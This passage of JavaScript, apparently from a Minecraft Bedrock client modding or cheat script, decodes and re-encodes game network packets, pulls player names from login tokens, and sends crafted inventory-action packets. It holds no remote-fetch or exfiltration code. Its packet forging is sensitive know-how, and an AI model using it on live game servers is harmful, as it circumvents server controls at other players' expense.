            encoded4 = _b64lookup[base64.charCodeAt(i + 3)];
            bytes[p++] = (encoded1 << 2) | (encoded2 >> 4);
            bytes[p++] = ((encoded2 & 15) << 4) | (encoded3 >> 2);
            bytes[p++] = ((encoded3 & 3) << 6) | (encoded4 & 63);
        }
        return bytes;
    }

    function formatUUID(bytes) {
        if (!bytes || bytes.length !== 16) return "";
        let hex = Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
        return `${hex.slice(0,8)}-${hex.slice(8,12)}-${hex.slice(12,16)}-${hex.slice(16,20)}-${hex.slice(20,32)}`;
    }

    function parseUUIDString(str) {
        let hex = String(str || "").replace(/-/g, '');
        let bytes = new Uint8Array(16);
        for (let i = 0; i < 16; i++) {
            bytes[i] = parseInt(hex.substr(i * 2, 2), 16) || 0;
        }
        return Array.from(bytes);
    }

    if (isRestore) {
        let packet = [];

        function writeUVarInt(val) {
            val = Math.max(0, val);
            let v = val;
            /* 变长整数编码保护：非有限值归零 + 字节掩码 + 最多 10 字节，
               避免写出非法字节或陷入不终止的循环。 */
            if (!isFinite(v)) v = 0;
            for (let _tuG = 0; _tuG < 10; _tuG++) {
                let temp = v % 128;
                v = Math.floor(v / 128);
                if (v > 0) temp |= 0x80;
                packet.push(temp & 0xFF);
                if (v === 0) break;
            }
        }

        function writeSVarInt(val) {
            let uval = val >= 0 ? val * 2 : (Math.abs(val) * 2) - 1;
            writeUVarInt(uval);
        }

        function writeString(str) {
            str = String(str || "");
            let strBytes = [];
            for (let i = 0; i < str.length; i++) {
                let code = str.charCodeAt(i);
                if (code < 0x80) {
                    strBytes.push(code);
                } else if (code < 0x800) {
                    strBytes.push(0xc0 | (code >> 6), 0x80 | (code & 0x3f));
                } else if (code < 0xd800 || code >= 0xe000) {
                    strBytes.push(0xe0 | (code >> 12), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
                } else {
                    i++;
                    let nextCode = i < str.length ? str.charCodeAt(i) : 0;
                    code = 0x10000 + (((code & 0x3ff) << 10) | (nextCode & 0x3ff));
                    strBytes.push(0xf0 | (code >> 18), 0x80 | ((code >> 12) & 0x3f), 0x80 | ((code >> 6) & 0x3f), 0x80 | (code & 0x3f));
                }
            }
            writeUVarInt(strBytes.length);
            for (let i = 0; i < strBytes.length; i++) packet.push(strBytes[i]);
        }

        function writeInt32LE(val) {
            val = Number(val) || 0;
            packet.push(val & 0xFF, (val >> 8) & 0xFF, (val >> 16) & 0xFF, (val >>> 24) & 0xFF);
        }

        function writeFloat32LE(val) {
            let buffer = new ArrayBuffer(4);
            new DataView(buffer).setFloat32(0, Number(val) || 0, true);
            let u8 = new Uint8Array(buffer);
            packet.push(u8[0], u8[1], u8[2], u8[3]);
        }

        function writeImage(img) {
            if (!img) {
                writeInt32LE(0);
                writeInt32LE(0);
                writeUVarInt(0);
                return;
            }
            writeInt32LE(img.width || 0);
            writeInt32LE(img.height || 0);
            let bytes = base64ToBytes(img.data || "");
            writeUVarInt(bytes.length);
            for (let i = 0; i < bytes.length; i++) packet.push(bytes[i]);
        }

        packet.push(data.action & 0xFF);
        writeUVarInt(data.entries ? data.entries.length : 0);

        if (data.entries) {
            for (let i = 0; i < data.entries.length; i++) {
                let entry = data.entries[i];
                let uuidBytes = parseUUIDString(entry.uuid);
                for (let j = 0; j < 16; j++) packet.push(uuidBytes[j]);

                if (data.action === 0) {
                    writeSVarInt(entry.entityUniqueId || 0);
                    writeString(entry.username);
                    writeString(entry.xuid);
                    writeString(entry.platformChatId);
                    writeInt32LE(entry.buildPlatform || 0);

                    let skin = entry.skin || {};
                    writeString(skin.skinId);
                    writeString(skin.playFabId);
                    writeString(skin.skinResourcePatch);
                    writeImage(skin.skinImage);

                    let anims = skin.animations || [];
                    writeInt32LE(anims.length);
                    for (let j = 0; j < anims.length; j++) {
                        writeImage(anims[j].image);
                        writeInt32LE(anims[j].type || 0);
                        writeFloat32LE(anims[j].frames || 0);
                        writeInt32LE(anims[j].expressionType || 0);
                    }

                    writeImage(skin.capeImage);
                    writeString(skin.geometryData);
                    writeString(skin.geometryDataEngineVersion);
                    writeString(skin.animationData);
                    writeString(skin.capeId);
                    writeString(skin.fullId);
                    writeString(skin.armSize);
                    writeString(skin.skinColor);

                    let pieces = skin.personalizedPieces || [];
                    writeInt32LE(pieces.length);
                    for (let j = 0; j < pieces.length; j++) writeString(pieces[j]);

                    let tints = skin.pieceTintColors || [];
                    writeInt32LE(tints.length);
                    for (let j = 0; j < tints.length; j++) {
                        writeString(tints[j].pieceType);
                        let colors = tints[j].colors || [];
                        writeInt32LE(colors.length);
                        for (let k = 0; k < colors.length; k++) writeString(colors[k]);
                    }

                    packet.push(skin.premiumSkin ? 1 : 0);
                    packet.push(skin.personaSkin ? 1 : 0);
                    packet.push(skin.personaCapeOnClassicSkin ? 1 : 0);
                    packet.push((skin.primaryColor || 0) & 0xFF);
                    packet.push(skin.overrideAppearance ? 1 : 0);
                    packet.push(entry.isTeacher ? 1 : 0);
                    packet.push(entry.isHost ? 1 : 0);
                    packet.push((entry.clientSubId || 0) & 0xFF);
                }
            }
        }
        return new Uint8Array(packet).buffer;

    } else {
        let u8 = new Uint8Array(data);
        let offset = 0;
        let view = new DataView(u8.buffer, u8.byteOffset, u8.byteLength);

        function readUVarInt() {
            let value = 0;
            let shift = 0;
            let byte;
            do {
                if (offset >= u8.length) break;
                byte = u8[offset++];
                value += (byte & 0x7F) * Math.pow(2, shift);
                shift += 7;
            } while (byte & 0x80);
            return value;
        }

        function readSVarInt() {
            let value = readUVarInt();
            let temp = Math.floor(value / 2);
            if (value % 2 !== 0) {
                temp = -temp - 1;
            }
            return temp;
        }

        function readString() {
            if (offset >= u8.length) return "";
            let len = readUVarInt();
            let str = "",
                end = Math.min(offset + len, u8.length);
            while (offset < end) {
                let c = u8[offset++];
                if (c < 0x80) str += String.fromCharCode(c);
                else if (c >= 0xC0 && c < 0xE0) str += String.fromCharCode(((c & 0x1F) << 6) | (u8[offset++] & 0x3F));
                else if (c >= 0xE0 && c < 0xF0) str += String.fromCharCode(((c & 0x0F) << 12) | ((u8[offset++] & 0x3F) << 6) | (u8[offset++] & 0x3F));
                else if (c >= 0xF0 && c < 0xF8) {
                    let u = (((c & 0x07) << 18) | ((u8[offset++] & 0x3F) << 12) | ((u8[offset++] & 0x3F) << 6) | (u8[offset++] & 0x3F)) - 0x10000;
                    str += String.fromCharCode(0xD800 | (u >> 10), 0xDC00 | (u & 0x3FF));
                }
            }
            return str;
        }

        function readImage() {
            if (offset + 8 > u8.length) return null;
            let w = view.getInt32(offset, true);
            offset += 4;
            let h = view.getInt32(offset, true);
            offset += 4;
            let len = readUVarInt();
            let imgData = new Uint8Array(0);
            if (len > 0 && offset + len <= u8.length) {
                imgData = u8.slice(offset, offset + len);
                offset += len;
            }
            return {
                width: w,
                height: h,
                data: bytesToBase64(imgData)
            };
        }

        let action = u8[offset++];
        let count = readUVarInt();
        let entries = [];

        for (let i = 0; i < count; i++) {
            if (offset + 16 > u8.length) break;
            let uuidRaw = u8.slice(offset, offset + 16);
            offset += 16;

            let uuidStr = formatUUID(uuidRaw);

            if (action === 0) {
                let entityUniqueId = readSVarInt();
                let username = readString();
                let xuid = readString();
                let platformChatId = readString();
                let buildPlatform = 0;
                if (offset + 4 <= u8.length) {
                    buildPlatform = view.getInt32(offset, true);
                    offset += 4;
                }

                let skinId = readString();
                let playFabId = readString();
                let skinResourcePatch = readString();
                let skinImage = readImage();

                let animationsCount = 0;
                if (offset + 4 <= u8.length) {
                    animationsCount = view.getInt32(offset, true);
                    offset += 4;
                }
                let animations = [];
                for (let j = 0; j < animationsCount; j++) {
                    let img = readImage();
                    let type = 0,
                        frames = 0,
                        expr = 0;
                    if (offset + 12 <= u8.length) {
                        type = view.getInt32(offset, true);
                        offset += 4;
                        frames = view.getFloat32(offset, true);
                        offset += 4;
                        expr = view.getInt32(offset, true);
                        offset += 4;
                    }
                    animations.push({
                        image: img,
                        type: type,
                        frames: frames,
                        expressionType: expr
                    });
                }

                let capeImage = readImage();
                let geometryData = readString();
                let geometryDataEngineVersion = readString();
                let animationData = readString();
                let capeId = readString();
                let fullId = readString();
                let armSize = readString();
                let skinColor = readString();

                let personalizedPiecesCount = 0;
                if (offset + 4 <= u8.length) {
                    personalizedPiecesCount = view.getInt32(offset, true);
                    offset += 4;
                }
                let personalizedPieces = [];
                for (let j = 0; j < personalizedPiecesCount; j++) personalizedPieces.push(readString());

                let pieceTintColorsCount = 0;
                if (offset + 4 <= u8.length) {
                    pieceTintColorsCount = view.getInt32(offset, true);
                    offset += 4;
                }
                let pieceTintColors = [];
                for (let j = 0; j < pieceTintColorsCount; j++) {
                    let pieceType = readString();
                    let colorsCount = 0;
                    if (offset + 4 <= u8.length) {
                        colorsCount = view.getInt32(offset, true);
                        offset += 4;
                    }
                    let colors = [];
                    for (let k = 0; k < colorsCount; k++) colors.push(readString());
                    pieceTintColors.push({
                        pieceType: pieceType,
                        colors: colors
                    });
                }

                let premiumSkin = 0,
                    personaSkin = 0,
                    personaCapeOnClassicSkin = 0,
                    primaryColor = 0,
                    overrideAppearance = 0;
                if (offset < u8.length) premiumSkin = u8[offset++];
                if (offset < u8.length) personaSkin = u8[offset++];
                if (offset < u8.length) personaCapeOnClassicSkin = u8[offset++];
                if (offset < u8.length) primaryColor = u8[offset++];
                if (offset < u8.length) overrideAppearance = u8[offset++];

                let isTeacher = false,
                    isHost = false,
                    clientSubId = 0;
                if (offset < u8.length) isTeacher = u8[offset++] !== 0;
                if (offset < u8.length) isHost = u8[offset++] !== 0;
                if (offset < u8.length) clientSubId = u8[offset++];

                entries.push({
                    uuid: uuidStr,
                    entityUniqueId: entityUniqueId,
                    username: username,
                    xuid: xuid,
                    platformChatId: platformChatId,
                    buildPlatform: buildPlatform,
                    skin: {
                        skinId: skinId,
                        playFabId: playFabId,
                        skinResourcePatch: skinResourcePatch,
                        skinImage: skinImage,
                        animations: animations,
                        capeImage: capeImage,
                        geometryData: geometryData,
                        geometryDataEngineVersion: geometryDataEngineVersion,
                        animationData: animationData,
                        capeId: capeId,
                        fullId: fullId,
                        armSize: armSize,
                        skinColor: skinColor,
                        personalizedPieces: personalizedPieces,
                        pieceTintColors: pieceTintColors,
                        premiumSkin: premiumSkin !== 0,
                        personaSkin: personaSkin !== 0,
                        personaCapeOnClassicSkin: personaCapeOnClassicSkin !== 0,
                        primaryColor: primaryColor,
                        overrideAppearance: overrideAppearance !== 0
                    },
                    isTeacher: isTeacher,
                    isHost: isHost,
                    clientSubId: clientSubId
                });
            } else {
                entries.push({
                    uuid: uuidStr
                });
            }
        }

        return {
            action: action,
            entries: entries
        };
    }
}

function base64ToUtf8Str(base64) {
    if (!base64) return "";
    const _b64chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    const _b64lookup = new Uint8Array(256);
    for (let i = 0; i < _b64chars.length; i++) _b64lookup[_b64chars.charCodeAt(i)] = i;
    let bufferLength = base64.length * 0.75;
    let len = base64.length,
        i, p = 0;
    let encoded1, encoded2, encoded3, encoded4;
    if (base64[base64.length - 1] === '=') {
        bufferLength--;
        if (base64[base64.length - 2] === '=') bufferLength--;
    }
    let bytes = new Uint8Array(bufferLength);
    for (i = 0; i < len; i += 4) {
        encoded1 = _b64lookup[base64.charCodeAt(i)];
        encoded2 = _b64lookup[base64.charCodeAt(i + 1)];
        encoded3 = _b64lookup[base64.charCodeAt(i + 2)];
        encoded4 = _b64lookup[base64.charCodeAt(i + 3)];
        bytes[p++] = (encoded1 << 2) | (encoded2 >> 4);
        bytes[p++] = ((encoded2 & 15) << 4) | (encoded3 >> 2);
        bytes[p++] = ((encoded3 & 3) << 6) | (encoded4 & 63);
    }
    let str = "",
        offset = 0;
    while (offset < bytes.length) {
        let c = bytes[offset++];
        if (c < 0x80) str += String.fromCharCode(c);
        else if (c >= 0xC0 && c < 0xE0) str += String.fromCharCode(((c & 0x1F) << 6) | (bytes[offset++] & 0x3F));
        else if (c >= 0xE0 && c < 0xF0) str += String.fromCharCode(((c & 0x0F) << 12) | ((bytes[offset++] & 0x3F) << 6) | (bytes[offset++] & 0x3F));
        else {
            let u = (((c & 0x07) << 18) | ((bytes[offset++] & 0x3F) << 12) | ((bytes[offset++] & 0x3F) << 6) | (bytes[offset++] & 0x3F)) - 0x10000;
            str += String.fromCharCode(0xD800 | (u >> 10), 0xDC00 | (u & 0x3FF));
        }
    }
    return str;
}

function AddPlayer_readVarInt(cursor) {
    let value = 0;
    let shift = 0;
    let b;
    do {
        b = cursor.u8[cursor.offset++];
        value |= (b & 0x7F) << shift;
        shift += 7;
    } while (b & 0x80);
    return value >>> 0;
}

function AddPlayer_readVarLong(cursor) {
    let value = 0n;
    let shift = 0n;
    let b;
    do {
        b = cursor.u8[cursor.offset++];
        value |= BigInt(b & 0x7F) << shift;
        shift += 7n;
    } while (b & 0x80);
    return value.toString();
}

function AddPlayer_readString(cursor) {
    const len = AddPlayer_readVarInt(cursor);
    const end = cursor.offset + len;
    let str = "";

    while (cursor.offset < end) {
        let c = cursor.u8[cursor.offset++];
        if (c < 128) {
            str += String.fromCharCode(c);
        } else if (c > 191 && c < 224) {
            let c2 = cursor.u8[cursor.offset++];
            str += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
        } else if (c > 223 && c < 240) {
            let c2 = cursor.u8[cursor.offset++];
            let c3 = cursor.u8[cursor.offset++];
            str += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
        } else {
            let c2 = cursor.u8[cursor.offset++];
            let c3 = cursor.u8[cursor.offset++];
            let c4 = cursor.u8[cursor.offset++];
            let cp = ((c & 7) << 18) | ((c2 & 63) << 12) | ((c3 & 63) << 6) | (c4 & 63);
            cp -= 0x10000;
            str += String.fromCharCode(0xD800 + (cp >> 10));
            str += String.fromCharCode(0xDC00 + (cp & 0x3FF));
        }
    }
    return str;
}

function ParseAddPlayer(buffer) {
    const cursor = {
        u8: buffer instanceof Uint8Array ? buffer : new Uint8Array(buffer),
        offset: 0
    };
    cursor.offset += 16;
    const name = AddPlayer_readString(cursor);
    const runtimeId = AddPlayer_readVarLong(cursor);

    return {
        id: runtimeId,
        name: name
    };
}

function GetNameFromLoginPacket(buffer) {
    let binaryString = "";
    if (typeof buffer === 'string') {
        const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        const lookup = new Uint8Array(256);
        for (let i = 0; i < chars.length; i++) lookup[chars.charCodeAt(i)] = i;
        let length = buffer.length;
        while (length > 0 && buffer[length - 1] === '=') length--;
        const len = Math.floor((length * 3) / 4);
        const bytes = new Uint8Array(len);
        let a, b, c, d, i = 0,
            j = 0;
        while (i < length) {
            a = lookup[buffer.charCodeAt(i++)];
            b = lookup[buffer.charCodeAt(i++)];
            c = lookup[buffer.charCodeAt(i++)];
            d = lookup[buffer.charCodeAt(i++)];
            bytes[j++] = (a << 2) | (b >> 4);
            if (j < len) bytes[j++] = ((b & 15) << 4) | (c >> 2);
            if (j < len) bytes[j++] = ((c & 3) << 6) | d;
        }
        for (let k = 0; k < bytes.length; k++) {
            binaryString += String.fromCharCode(bytes[k]);
        }
    } else {
        const bytes = new Uint8Array(buffer instanceof ArrayBuffer ? buffer : buffer.buffer);
        for (let k = 0; k < bytes.length; k++) {
            binaryString += String.fromCharCode(bytes[k]);
        }
    }

    const jsonStartIndex = binaryString.indexOf('{"chain":');
    if (jsonStartIndex === -1) return "";

    let braceCount = 0;
    let jsonEndIndex = -1;

    for (let i = jsonStartIndex; i < binaryString.length; i++) {
        if (binaryString[i] === '{') braceCount++;
        else if (binaryString[i] === '}') braceCount--;

        if (braceCount === 0) {
            jsonEndIndex = i + 1;
            break;
        }
    }

    if (jsonEndIndex === -1) return "";

    try {
        const jsonRaw = binaryString.substring(jsonStartIndex, jsonEndIndex);
        const data = JSON.parse(jsonRaw);

        if (data.chain && Array.isArray(data.chain)) {
            for (const token of data.chain) {
                const parts = token.split('.');
                if (parts.length !== 3) continue;

                let payloadBase64 = parts[1];
                while (payloadBase64.length % 4 !== 0) {
                    payloadBase64 += '=';
                }
                payloadBase64 = payloadBase64.replace(/-/g, '+').replace(/_/g, '/');

                const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
                const lookup = new Uint8Array(256);
                for (let i = 0; i < chars.length; i++) lookup[chars.charCodeAt(i)] = i;

                let length = payloadBase64.length;
                while (length > 0 && payloadBase64[length - 1] === '=') length--;

                const len = Math.floor((length * 3) / 4);
                const bytes = new Uint8Array(len);
                let a, b, c, d, i = 0,
                    j = 0;

                while (i < length) {
                    a = lookup[payloadBase64.charCodeAt(i++)];
                    b = lookup[payloadBase64.charCodeAt(i++)];
                    c = lookup[payloadBase64.charCodeAt(i++)];
                    d = lookup[payloadBase64.charCodeAt(i++)];

                    bytes[j++] = (a << 2) | (b >> 4);
                    if (j < len) bytes[j++] = ((b & 15) << 4) | (c >> 2);
                    if (j < len) bytes[j++] = ((c & 3) << 6) | d;
                }

                let pStr = "";
                let k = 0;
                while (k < bytes.length) {
                    let c = bytes[k++];
                    if (c < 128) {
                        pStr += String.fromCharCode(c);
                    } else if (c > 191 && c < 224) {
                        let c2 = bytes[k++];
                        pStr += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    } else if (c > 223 && c < 240) {
                        let c2 = bytes[k++];
                        let c3 = bytes[k++];
                        pStr += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    } else {
                        let c2 = bytes[k++];
                        let c3 = bytes[k++];
                        let c4 = bytes[k++];
                        let u = ((c & 7) << 18) | ((c2 & 63) << 12) | ((c3 & 63) << 6) | (c4 & 63);
                        u -= 0x10000;
                        pStr += String.fromCharCode(0xD800 + (u >> 10), 0xDC00 + (u & 1023));
                    }
                }

                try {
                    const payloadObj = JSON.parse(pStr);
                    if (payloadObj.extraData && payloadObj.extraData.displayName) {
                        return payloadObj.extraData.displayName;
                    }
                } catch (e) {}
            }
        }
    } catch (e) {
        return "";
    }

    return "";
}

function ParseItemStackResponsePacket(data, isRestore = false) {
    if (isRestore) {
        let packet = [];

        function writeByte(val) {
            packet.push(Number(val) & 0xFF);
        }

        function writeUVarInt(val) {
            let v = val >>> 0;
            while (v >= 0x80) {
                packet.push((v & 0x7F) | 0x80);
                v >>>= 7;
            }
            packet.push(v);
        }

        function writeSVarInt(val) {
            let v = val >> 0;
            let uval = (v << 1) ^ (v >> 31);
            writeUVarInt(uval);
        }

        function writeString(str) {
            if (!str) str = "";
            let utf8 = unescape(encodeURIComponent(str));
            writeUVarInt(utf8.length);
            for (let i = 0; i < utf8.length; i++) {
                writeByte(utf8.charCodeAt(i));
            }
        }

        let responses = data.responses || [];
        writeUVarInt(responses.length);

        for (let i = 0; i < responses.length; i++) {
            let res = responses[i];
            let status = res.status !== undefined ? res.status : 0;
            writeByte(status);
            writeSVarInt(res.requestId !== undefined ? res.requestId : 0);

            if (status === 0) {
                let containers = res.containers || [];
                writeUVarInt(containers.length);

                for (let j = 0; j < containers.length; j++) {
                    let cont = containers[j];
                    writeByte(cont.containerId !== undefined ? cont.containerId : 0);
                    writeByte(cont.windowId !== undefined ? cont.windowId : 0);

                    let slots = cont.slots || [];
                    writeUVarInt(slots.length);

                    for (let k = 0; k < slots.length; k++) {
                        let slot = slots[k];
                        writeByte(slot.slot !== undefined ? slot.slot : 0);
                        writeByte(slot.hotbarSlot !== undefined ? slot.hotbarSlot : 0);
                        writeByte(slot.count !== undefined ? slot.count : 0);
                        writeSVarInt(slot.stackId !== undefined ? slot.stackId : 0);
                        writeString(slot.customName || "");
                        writeSVarInt(slot.durability !== undefined ? slot.durability : 0);
                        writeSVarInt(slot.networkId !== undefined ? slot.networkId : 0);
                    }
                }
            }
        }

        if (data.tailBytes) {
            for (let i = 0; i < data.tailBytes.length; i++) {
                writeByte(data.tailBytes[i]);
            }
        }

        return new Uint8Array(packet).buffer;

    } else {
        let u8;
        try {
            u8 = new Uint8Array(data);
        } catch (e) {
            u8 = new Uint8Array(data.length);
            for (let idx = 0; idx < data.length; idx++) {
                u8[idx] = data[idx] & 0xFF;
            }
        }
        let offset = 0;

        function readByte() {
            if (offset >= u8.length) return 0;
            return u8[offset++];
        }

        function readUVarInt() {
            let value = 0;
            let shift = 0;
            while (true) {
                if (offset >= u8.length) break;
                let byteData = u8[offset++];
                value |= (byteData & 0x7F) << shift;
                if ((byteData & 0x80) === 0) break;
                shift += 7;
            }
            return value >>> 0;
        }

        function readSVarInt() {
            let raw = readUVarInt();
            let temp = (raw >>> 1) ^ -(raw & 1);
            return temp | 0;
        }

        function readString() {
            let len = readUVarInt();
            let binaryStr = "";
            for (let i = 0; i < len; i++) {
                if (offset >= u8.length) break;
                binaryStr += String.fromCharCode(readByte());
            }
            try {
                return decodeURIComponent(escape(binaryStr));
            } catch (e) {
                return binaryStr;
            }
        }

        let result = {
            responses: []
        };

        let responsesCount = readUVarInt();

        for (let i = 0; i < responsesCount; i++) {
            let response = {};
            response.status = readByte();
            response.requestId = readSVarInt();

            response.containers = [];
            if (response.status === 0) {
                let containersCount = readUVarInt();

                for (let j = 0; j < containersCount; j++) {
                    let container = {
                        slots: []
                    };
                    container.containerId = readByte();
                    container.windowId = readByte();

                    let slotsCount = readUVarInt();

                    for (let k = 0; k < slotsCount; k++) {
                        let slotInfo = {};
                        slotInfo.slot = readByte();
                        slotInfo.hotbarSlot = readByte();
                        slotInfo.count = readByte();
                        slotInfo.stackId = readSVarInt();
                        slotInfo.customName = readString();
                        slotInfo.durability = readSVarInt();
                        slotInfo.networkId = readSVarInt();
                        container.slots.push(slotInfo);
                    }
                    response.containers.push(container);
                }
            }
            result.responses.push(response);
        }

        result.tailBytes = [];
        while (offset < u8.length) {
            result.tailBytes.push(readByte());
        }

        return result;
    }
}

const getInventoryItem = (slot) => nbt2object(getPlayerInventoryItem(self_id, slot));

const getNextRequestId = () => {
    const RequestId = ItemStackRequest_RequestId;
    return RequestId;
};

const getContainerId = (type, slotIndex = 0) => {
    const containerMap = {
        "armor": 6,
        "offhand": 7,
        "cursor": 12,
        "hotbar": 29,
        "inventory": 30,
        "crafting": 3
    };
    if (type === "auto") {
        if (slotIndex >= 0 && slotIndex <= 8) {
            return 29;
        } else if (slotIndex >= 9 && slotIndex <= 35) {
            return 30;
        }
    }
    return containerMap[type] || -1;
};

const sendItemStackRequest = (actions) => {
    const Stack_RequestId = getNextRequestId();
    const buffer = ParseItemStackRequestPacket({
        requests: [{
            requestId: Stack_RequestId,
            actions: actions,
            filterStrings: [],
            tailBytes: [255, 255, 255, 255]
        }]
    }, true);
    return sendNetworkPacket(147, buffer);
};

const MoveInventoryItem = (fromSlot, toSlot, merge = false) => {
    const item = getInventoryItem(fromSlot);
    if (!item || item.namespace === "minecraft:air") return;
    const item2 = getInventoryItem(toSlot);
    if (!merge) {
        if (!item2 || item2.namespace === "minecraft:air") {
            return sendItemStackRequest([{
                type: 1,
                count: item.count || 1,
                source: {
                    containerId: getContainerId("auto", fromSlot),
                    windowId: 0,
                    slot: fromSlot,
                    stackId: item.id || 0
                },
                destination: {
                    containerId: getContainerId("auto", toSlot),
                    windowId: 0,
                    slot: toSlot,
                    stackId: 0
                }
            }]);
        }
        return sendItemStackRequest([{
            type: 2,
            source: {
                containerId: getContainerId("auto", fromSlot),
                windowId: 0,
                slot: fromSlot,
                stackId: item.id || 0
            },
            destination: {
                containerId: getContainerId("auto", toSlot),
                windowId: 0,
                slot: toSlot,
                stackId: item2.id || 0
            }
        }]);
    }
    if (!item2 || item.namespace !== item2.namespace) return;
    const maxStack = ["minecraft:egg", "minecraft:ender_pearl", "minecraft:snowball"].includes(item.namespace) ? 16 : 64;
    const moveCount = Math.min(item.count, maxStack - item2.count);
    if (moveCount <= 0) return;
    return sendItemStackRequest([{
        type: 1,
        count: moveCount,
        source: {
            containerId: getContainerId("auto", fromSlot),
            windowId: 0,
            slot: fromSlot,
            stackId: item.id || 0
        },
        destination: {
            containerId: getContainerId("auto", toSlot),
            windowId: 0,
            slot: toSlot,
            stackId: item2.id || 0
        }
    }]);
};

const SwapInventoryItem = (fromSlot, toSlot) => {
    const item = getInventoryItem(fromSlot);
    const item2 = getInventoryItem(toSlot);
    if (item.namespace === "minecraft:air") return;
    const targetStackId = item2.namespace === "minecraft:air" ? 0 : (item2.id || 0);
    return sendItemStackRequest([{
        type: 2,
        source: {
            containerId: getContainerId("auto", fromSlot),
            windowId: 0,
            slot: fromSlot,
            stackId: item.id || 0
        },
        destination: {
            containerId: getContainerId("auto", toSlot),
            windowId: 0,
            slot: toSlot,
            stackId: targetStackId
        }
    }]);
};

const EquipLocalPlayerArmor = (fromSlot, toSlot) => {
    const isFromArmor = fromSlot >= 100;
    const realFromSlot = isFromArmor ? fromSlot - 100 : fromSlot;
    const isToArmor = toSlot >= 100;
    const realToSlot = isToArmor ? toSlot - 100 : toSlot;
    let item;
    if (isFromArmor) {
        const nbt = getPlayerArmorItem(self_id, realFromSlot);
        item = nbt ? nbt2object(nbt) : {
            namespace: "minecraft:air",
            count: 0
        };
    } else {
        item = getInventoryItem(realFromSlot);
    }
    if (!item || item.namespace === "minecraft:air") return;
    let item2;
    if (isToArmor) {
        const nbt2 = getPlayerArmorItem(self_id, realToSlot);
        item2 = nbt2 ? nbt2object(nbt2) : {
            namespace: "minecraft:air"
        };
    } else {
        item2 = getInventoryItem(realToSlot);
    }
    const sourceStackId = item.id || 0;
    const targetStackId = (!item2 || item2.namespace === "minecraft:air") ? 0 : (item2.id || 0);
    const sourceData = {
        containerId: isFromArmor ? getContainerId("armor") : getContainerId("auto", realFromSlot),
        windowId: 0,
        slot: realFromSlot,
        stackId: sourceStackId
    };
    const destData = {
        containerId: isToArmor ? getContainerId("armor") : getContainerId("auto", realToSlot),
        windowId: 0,
        slot: realToSlot,
        stackId: targetStackId
    };
    if (targetStackId === 0) {
        return sendItemStackRequest([{
            type: 1,
            count: item.count,
            source: sourceData,
            destination: destData
        }]);
    } else {
        return sendItemStackRequest([{
            type: 2,
            source: sourceData,
            destination: destData
        }]);
    }
};

const dropInventoryItem = (Slot) => {
    const InventoryItem = getInventoryItem(Slot);
    return sendItemStackRequest([{
        type: 3,
        count: InventoryItem.count || 1,
        source: {
            containerId: getContainerId("auto", Slot),
            windowId: 0,
            slot: Slot,
            stackId: InventoryItem.id || 0
        },
        randomly: 0
    }]);
};

function getFPS() {
    const Path = _app.getResource() + "/TimeUnity/Fps.txt";
    _app.evalPython(`
import mod.client.extraClientApi as clientApi, os
with open("${Path}", "w") as f:
        f.write(str(clientApi.GetEngineCompFactory().CreateGame(clientApi.GetLevelId()).GetFps()))
`);
    if (_fs.exists(Path)) {
        const Fps = _fs.read(Path);
        _fs.remove(Path);
        return Math.floor(Fps);
    } else {
        return 0;
    }
}

function DestroyBlockRender() {
    if (!DestroyBlockRender_Enabled && !DestroyBlocks || !DestroyBlocks.isDestroy) {
        if (DestroyBlockRender_Shape) {
            removeShape(DestroyBlockRender_Shape.Id);
            DestroyBlockRender_Shape = null;
            DestroyBlockRender_CurrentPos = null;
        }
        return;
    }
    const X = DestroyBlocks.Pos.x;
    const Y = DestroyBlocks.Pos.y;
    const Z = DestroyBlocks.Pos.z;
    if (!DestroyBlockRender_CurrentPos || DestroyBlockRender_CurrentPos.x !== X || DestroyBlockRender_CurrentPos.y !== Y || DestroyBlockRender_CurrentPos.z !== Z) {
        if (DestroyBlockRender_Shape) removeShape(DestroyBlockRender_Shape.Id);
        const Block = getBlock(X, Y, Z);
        const SelectSlot = getPlayerSelectItemSlot(self_id);
        const BlockDestroyTime = getPlayerBlockDestroyTime(self_id, SelectSlot, Block.namespace);
        const TicksNeeded = 1 / BlockDestroyTime;
        DestroyBlockRender_Duration = TicksNeeded * 50;
        DestroyBlockRender_StartTime = Date.now();
        const Cx = X + 0.5;
        const Cy = Y + 0.5;
        const Cz = Z + 0.5;
        const ShapeId = createShape({
            type: 'box',
            isFill: true,
            lower: {
                x: Cx,
                y: Cy,
                z: Cz
            },
            upper: {
                x: Cx,
                y: Cy,
                z: Cz
            },
            color: {
                r: 1,
                g: 1,
                b: 1,
                a: 0.9
            }
        });

        DestroyBlockRender_Shape = {
            Id: ShapeId,
            Cx,
            Cy,
            Cz
        };
        DestroyBlockRender_CurrentPos = {
            x: X,
            y: Y,
            z: Z
        };
        return;
    }
    const Progress = Math.min((Date.now() - DestroyBlockRender_StartTime) / DestroyBlockRender_Duration, 1);
    const Half = 0.5 * Progress;
    updateShape(DestroyBlockRender_Shape.Id, {
        lower: {
            x: DestroyBlockRender_Shape.Cx - Half,
            y: DestroyBlockRender_Shape.Cy - Half,
            z: DestroyBlockRender_Shape.Cz - Half
        },
        upper: {
            x: DestroyBlockRender_Shape.Cx + Half,
            y: DestroyBlockRender_Shape.Cy + Half,
            z: DestroyBlockRender_Shape.Cz + Half
        }
    });
    if (Progress >= 1) {
        removeShape(DestroyBlockRender_Shape.Id);
        DestroyBlockRender_Shape = null;
        DestroyBlockRender_CurrentPos = null;
    }
}

function ColorToRGBA(num) {
    num = num >>> 0;
    const r = ((num >> 16) & 0xFF) / 255;
    const g = ((num >> 8) & 0xFF) / 255;
    const b = (num & 0xFF) / 255;
    const a = ((num >> 24) & 0xFF) / 255;
    return [r, g, b, a];
}

function Tool_Exit() {
    thread(() => {
        /* 先把 tick 回调换成空函数（而不是 delete），避免引擎在同一帧继续
           回调已开始卸载的脚本。 */
        try { globalThis.onTickEvent = function () { }; } catch (e) { }
